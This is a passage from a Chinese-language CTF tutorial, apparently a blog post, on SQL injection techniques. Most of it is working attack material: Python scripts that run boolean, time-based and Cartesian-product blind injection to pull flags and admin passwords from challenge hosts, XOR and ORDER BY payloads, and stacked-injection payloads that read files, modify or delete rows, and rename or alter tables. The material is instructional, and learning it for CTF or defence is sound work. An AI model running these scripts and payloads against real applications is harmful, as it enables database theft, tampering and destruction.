<span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li><li><p>POST型注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       <span class="comment">#payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span></span><br><span class="line">       payload = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot;</span> %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;girlfriend&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><p>首先，我们先分析脚本的思路，脚本利用了request库来发送请求，同时定义了一个flag字符串用来储存flag。然后写了一个for循环，封顶跑250遍，然后定义了low和high，这里根据的是ASCII码中的打印字符，定义了中间值，因为一会儿要使用的是二分法，当low&lt;high时进入while循环，执行payload是否大于mid的判断，这里GET和POST略有区别，GET传入的键值对，利用requests.post方法进行请求，GET直接把Payload拼接在url后面进行requests.get方法即可，然后根据我们判断真假的方式写一个if循环，这里的res.text是返回数据，可以先写个简单脚本看一下该怎么从其中判断真假，如果为真low&#x3D;mid+1，然后再取中间值，如果为假则high&#x3D;mid然后取中间值，直到low大于high就能确定出该位置的ASCII码了，然后最下面的if循环是排除掉在两端的特殊情况，然后每次循环打印一次flag，有时候可能还要设置延时，这里没有管。</p><p>利用异或的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^1--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^0--+</span><br><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><p>利用order by的</p><pre><code>该方法只适用于表里就一行数据的时候。</code></pre><p>如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 过滤了括号 的时候，order by 盲注也是个很好的办法。<br>order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。<br>利用方式参见如下测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;5&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;6&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;51&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;52&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到password</p><p>参考脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 定义一个flag取值的一个“范围”</span></span><br><span class="line">dic = <span class="string">&quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span></span><br><span class="line"><span class="comment"># 之所以不定义为空，而是“^”，是为了从头开始匹配</span></span><br><span class="line">flag = <span class="string">&quot;^&quot;</span></span><br><span class="line"><span class="comment"># 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准</span></span><br><span class="line">url1 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span></span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"><span class="comment"># 这个flag的长度被定义为了50个字符长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># 从定义的dic中挨个取1字符，拼凑payload</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        <span class="comment">#该url最后的“&#125;2b1”--&gt;&quot;&#125;+1&quot;</span></span><br><span class="line">        url2 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;</span>+<span class="string">&quot;&#x27;&quot;</span>+ payload +<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;&#125;%2b1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(url2)</span><br><span class="line">        <span class="comment"># 获取实际注入后的排列内容</span></span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        <span class="comment"># 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）</span></span><br><span class="line">        <span class="keyword">if</span>(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。</p><p>对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求， 观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><p>首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">1 and sleep(5)</span></span><br></pre></td></tr></table></figure><p>时间盲注用到的SQL语法知识<br>一般的时间盲注主要就是使用sleep()函数进行时间的延迟，然后通过if判断是否执行sleep()：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span></span><br></pre></td></tr></table></figure><p>trim配合比较。</p><p>trim([both&#x2F;leading&#x2F;trailing] 目标字符串 FROM 源字符串)</p><p>从源字符串中去除首尾&#x2F;首&#x2F;尾的目标字符串，如寻找字符串第一位，假定X代表某字符，trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)不相等，说明正确结果是X或X+1再进行trim(leading X+1 from ‘abcd’) &#x3D; trim(leading X+2 from ‘abcd’) 相等则正确为X，不相等则X+1正确</p><p>若trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等</p><h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>时间盲注我们也是利用脚本完成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1&#x27; and if((ascii(substr(database(),%d,1))&gt;%d),sleep(2),1)-- &quot;</span> %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这是一个GET方式的时间盲注，更改脚本请求方式的方法可以参照上面的布尔盲注，这两个脚本的编写思路是一样的，只是在判断方式上有所区别。</p><p>时间盲注在CTF比赛和平时生产环境中都是比较常见的，但是当我们常⽤的函数被过滤的话，那该怎么办呢？还有以下几种时间盲注方式。</p><p>笛卡尔积延时盲注<br>count(*) 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 打时间差，从而达到延时注入的效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test <span class="built_in">where</span> user=<span class="string">&#x27;1&#x27;</span> and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | <span class="built_in">pwd</span> |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.08 sec)</span><br></pre></td></tr></table></figure><p>得到的结果都会有延迟。这里选用information_schema.columns表的原因是其内部数据较多，到时候可以根据实际情况调换。</p><p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[OUTPUT:]</span></span><br><span class="line"><span class="string">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span></span><br></pre></td></tr></table></figure><p>给出一个笛卡尔积延时注入脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot;</span> % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=<span class="literal">None</span>)    <span class="comment"># 不限制超时</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;504 Gateway Time-out&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在SQL中，分号; 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？ 因此这个想法也就造就了堆叠注入。</p><p>而联合注入也是将两条语句合并在一起，两者之间有什么区别么？</p><p>区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是查询语句，而堆叠注入可以执行的是任意的语句。 例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：select * from products where id&#x3D;1;DELETE FROM products; 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用 union 联合注入。</p><p>一般存在堆叠注入的都是由于使用 mysqli_multi_query() 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p><h3 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show databases;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show tables;--+</span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show tables from database_name;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;select load_file(&#x27;</span>/flag<span class="string">&#x27;);--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 修改数据表的结构</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password)values(20,<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;657260&#x27;</span>);--+    <span class="comment"># 插入数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users set password=&#x27;</span>657260<span class="string">&#x27; where id&gt;0;--+    # 更改数据</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;delete from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>=20;--+    <span class="comment"># 删除数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table fake_users like users;--+    # 创建一个新表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;rename table old_table to new_table;--+    <span class="comment"># 更改表名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;;alter table users change old_column new_column varchar(100);--+    # 更改字段名</span></span><br></pre></td></tr></table></figure><p>下面是MySQL堆叠注入的几种常见姿势。</p><p>rename 修改表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;#</span></span><br><span class="line"><span class="string"># rename命令用于修改表名。</span></span><br><span class="line"><span class="string"># rename命令格式：rename table 原表名 to 新表名;</span></span><br></pre></td></tr></table></figure><p>rename&#x2F;alter 修改表名与字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rename命令用于修改表名。</span></span><br><span class="line"><span class="string">rename命令格式：rename table 原表名 to 新表名;</span></span><br></pre></td></tr></table></figure><p>利用 HANDLER 语句<br>如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。</p><p>HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭，详情请见：<a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">https://www.cnblogs.com/taoyaostudy/p/13479367.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">1&#x27;</span>;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>堆叠注入中的盲注<br>堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还涉及到了一些json的内容，json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。web服务中传输信息的一种方式。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" 